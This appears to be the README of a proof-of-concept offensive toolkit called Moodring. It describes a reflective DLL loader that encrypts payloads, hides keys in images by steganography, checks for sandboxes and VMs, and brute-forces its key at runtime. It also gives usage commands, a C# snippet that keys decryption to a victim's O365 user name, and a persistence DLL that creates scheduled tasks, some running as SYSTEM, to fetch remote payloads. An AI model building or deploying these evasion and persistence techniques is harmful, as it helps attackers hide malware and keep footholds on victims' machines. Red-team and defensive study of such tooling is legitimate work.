## Moodring
PoC reflective DLL loader with encryption, steg and env checks. Decryption key is bruteforced at runtime.

### Cryptorchid - Encrypt and Hide 
Command line Encrypt/Decrypt tool, can test if the hash can be retrieved and payload decrypted successfully prior to putting it in the pipeline

```powershell
# Skip DNS check, use steganography, and encrypt the dll using AAAA and steg the hash into nogo.png, to created nogo_copy.png
 .\Cryptorchid.exe -nodns -steg AAAA .\calc.dll .\nogo.png

# Check DNS match for google and check for Sandbox VMs, looks for encyrpted 'mod.txt' and nogo_copy.png in the current dir, bruteforce to decrypt and load
# This is to test the loader.
 .\Cryptorchid.exe 8.8.8.8 -antivm -stegload .\nogo_copy.png

 # Pull hash from steg image and decrypt output to view (meant for text/test, will print the contents of dlls)
 .\Cryptorchid.exe -nodns -desteg  .\nogo_copy.png
```

### Decryptorchid - Decrypts payload from encrypted text file using hash stored in image
Sideloading DLL, bruteforces the payloads decryption and loads target into memory, invoking your desired method. 

TODO: Have this an encrypted value we can pull as well from another image, get rid of the text file.
TODO: if O365, keying off the email is possible since regkey can be used that contains users email.
 Query Key > Hash Value > Store Hash and Compare against our stored value, if match, decrypt.

string storedHashValue = "";
 string regValue = Microsoft.Win32.Registry.GetValue(@"HKEY_CURRENT_USER\", "upn" null);
string upnName = (string)regValue;
 string hashedUpnValue = GetSHA256Hash(upnName);
 bool correctKey = hashedUpnValue.Equals(storedHashValue);
 if (correctKey){
    var rawPayload = rc4EncDecrypt(Encoding.UTF8.GetBytes(payload), upnName);
 }
 // run that motha

 Nope, target the ost/nst file instead, regkey incosistent.


### Taskmasker 
Persister DLL, checks users permissions and creates a task, fetching a remote payload to an AppData directory. If admin, two tasks are created, one to run as SYSTEM. 

